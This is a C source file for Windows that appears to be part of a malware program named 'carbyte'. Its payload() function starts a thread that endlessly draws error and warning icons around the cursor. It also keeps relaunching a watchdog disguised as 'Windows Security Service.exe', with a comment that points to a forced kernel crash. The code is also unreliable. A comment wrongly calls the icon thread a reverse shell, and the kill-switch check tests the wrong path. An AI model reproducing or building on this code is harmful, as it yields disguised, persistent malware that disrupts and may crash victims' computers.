#include <Windows.h>
#include <io.h>

#include "utils.h"

extern char serviceName[64];

DWORD WINAPI smile(){
    int ix = GetSystemMetrics(SM_CXICON) / 2;
    int iy = GetSystemMetrics(SM_CYICON) / 2;

    HWND hwnd = GetDesktopWindow();
    HDC hdc = GetWindowDC(hwnd);

    POINT cursor;

    while(1){
        GetCursorPos(&cursor);
        
        DrawIcon(hdc, cursor.x - ix, cursor.y - iy, LoadIcon(NULL, IDI_ERROR));

        DrawIcon(hdc, cursor.x - ix - 30, cursor.y - iy - 30, LoadIcon(NULL, IDI_INFORMATION));
        DrawIcon(hdc, cursor.x - ix + 30, cursor.y - iy - 30, LoadIcon(NULL, IDI_INFORMATION));
        
        DrawIcon(hdc, cursor.x - ix - 15, cursor.y - iy + 30, LoadIcon(NULL, IDI_WARNING));
        DrawIcon(hdc, cursor.x - ix + 15, cursor.y - iy + 30, LoadIcon(NULL, IDI_WARNING));
        DrawIcon(hdc, cursor.x - ix - 45, cursor.y - iy + 15, LoadIcon(NULL, IDI_WARNING));
        DrawIcon(hdc, cursor.x - ix + 45, cursor.y - iy + 15, LoadIcon(NULL, IDI_WARNING));
        Sleep(10);
    }

    ReleaseDC(hwnd, hdc);
}

// Execute the payload
void payload(){
    // Create a thread for the reverse shell
    CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)smile, NULL, 0, NULL);

    while(1){
        if(!findFirstProc("Windows Security Service.exe")){
            char destination[MAX_PATH];
            GetDestination(destination);

            char killswitchDestination[MAX_PATH];
            strcpy(killswitchDestination, destination);
            strcat(killswitchDestination, serviceName);
            strcat(killswitchDestination, "\\");
            strcat(killswitchDestination, "carbyte_killswitch");

            // Return if the killswitch is present
            if(_access(destination, 0)) return;

            // KERNEL_SECURITY_CHECK_FAILURE (0x139)
            char watchdogDestination[MAX_PATH];
            strcpy(watchdogDestination, destination);
            strcat(watchdogDestination, "AMS\\Windows Security Service.exe");
            StartProgram(watchdogDestination, watchdogDestination, "-watchdog");
        }
        Sleep(100);
    }
}